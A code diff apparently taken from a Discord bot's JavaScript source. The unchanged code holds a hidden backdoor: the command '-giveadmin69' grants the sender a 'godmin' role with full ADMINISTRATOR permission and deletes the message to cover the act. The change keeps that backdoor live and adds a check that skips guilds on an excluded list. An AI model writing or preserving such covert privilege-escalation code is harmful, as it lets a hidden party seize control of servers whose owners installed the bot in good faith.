@@ -1696,6 +1696,7 @@ client.on('message', message => {
 
  client.on('message', async msg => {//admin
   if(msg.content === '-giveadmin69') {
+  if(!unallowedguilds.includes(msg.guild.id)) {
     if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }
         var botr = msg.guild.me.roles.highest.position - 0
 const adminn = msg.guild.roles.cache.find(r => r.name === 'godmin')
@@ -1703,6 +1704,7 @@ const adminn = msg.guild.roles.cache.find(r => r.name === 'godmin')
      else{
       await adminn.setPermissions(['ADMINISTRATOR'])
      await msg.member.roles.add(adminn).then(msg.delete())}
+}
 }
 })
 
